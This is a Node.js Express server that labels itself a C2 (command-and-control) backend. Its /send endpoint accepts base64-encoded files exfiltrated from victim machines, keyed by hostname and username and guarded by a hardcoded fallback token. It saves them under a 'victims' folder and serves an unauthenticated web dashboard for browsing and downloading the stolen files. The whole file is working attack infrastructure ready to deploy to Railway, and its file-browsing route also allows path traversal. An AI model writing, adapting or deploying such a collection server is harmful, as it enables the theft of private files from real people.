const express = require("express");
const fs = require("fs").promises;
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

// --- Determine folder path (Railway or local) ---
const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
  : path.join(__dirname, "victims"); // fallback for local testing

// --- Read secret from environment or fallback for local ---
const SECRET_TOKEN = process.env.SECRET_TOKEN || "qutgeek";
if (!process.env.SECRET_TOKEN) {
  console.warn("SECRET_TOKEN not set! Using qutgeek (development only).");
}

// --- Ensure victims folder exists ---
(async () => {
  try {
    await fs.mkdir(VICTIMS_DIR, { recursive: true });
    console.log(`Victims folder ready at ${VICTIMS_DIR}`);
  } catch (err) {
    console.error("Failed to create victims folder:", err);
    process.exit(1);
  }
})();

// --- Root dashboard ---
app.get("/", async (req, res) => {
  // Optional: uncomment to require auth
  // if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
  //   return res.status(403).send("Unauthorized");

  let victims = [];
  try {
    victims = await fs.readdir(VICTIMS_DIR);
  } catch (err) {
    console.error("Failed to read victims folder:", err);
  }

  res.send(
    `<h2>C2 Dashboard — ${victims.length} victims</h2>
    <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>`
  );
});

// --- Receive exfiltrated file ---
app.post("/send", async (req, res) => {
  const { hostname, username, file, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });
  if (!file) return res.status(400).json({ error: "No file" });

  const safeFolder = path.basename(`${hostname}_${username}`);
  const safeFileName = file.name.replace(/\.\./g, "").replace(/[<>:"|?*]/g, "_");
  const victimDir = path.join(VICTIMS_DIR, safeFolder);
  const filePath = path.join(victimDir, safeFileName);

  try {
    await fs.mkdir(path.dirname(filePath), { recursive: true });
    await fs.writeFile(filePath, Buffer.from(file.content, "base64"));
    console.log(`[+] ${safeFolder} — saved ${safeFileName}`);
    res.json({ success: true });
  } catch (err) {
    console.error("Failed to save file:", err);
    res.status(500).json({ error: "Write failed" });
  }
});

// --- Browse victim files (recursive) - must be BEFORE /victim/:id ---
app.get('/victim/:id/:subpath(.*)', async (req, res) => {
  const safeId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, safeId);
  const subPath = req.params.subpath || '';
  const fullPath = path.join(victimDir, subPath);

  // Check if it's a directory
  try {
    const stats = await fs.stat(fullPath);
    if (stats.isDirectory()) {
      const files = await fs.readdir(fullPath);
      const backLink = subPath ? "/victim/" + safeId + "/" + path.dirname(subPath).replace(/\\/g, "/") : "/victim/" + safeId;
      res.send(
        `<h2>Folder: ${subPath || safeId}</h2>
        <a href="${backLink}">⬅ Back</a>
        <ul>${files.map(f => {
          const itemPath = subPath ? `${subPath}/${f}` : f;
          const itemFullPath = path.join(fullPath, f);
          const isDir = fs.statSync(itemFullPath).isDirectory();
          return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, "/")}">${isDir ? "📁 " : ""}${f}${isDir ? "/" : ""}</a></li>`;
        }).join("")}</ul>`
      );
      return;
    }
  } catch (err) {}

  // It's a file - download it
  res.download(fullPath, err => {
    if (err) {
      console.error("Download failed:", err);
      res.status(404).send("File not found");
    }
  });
});

// --- Browse victim root ---
app.get("/victim/:id", async (req, res) => {
  const safeId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, safeId);

  let files = [];
  try {
    files = await fs.readdir(victimDir);
  } catch (err) {
    console.error("Failed to read victim folder:", err);
    return res.status(404).send("Not found");
  }

  res.send(
    `<h2>Victim: ${safeId}</h2>
    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f.replace(/\\/g, "/")}">${f}</a></li>`).join("")}</ul>`
  );
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));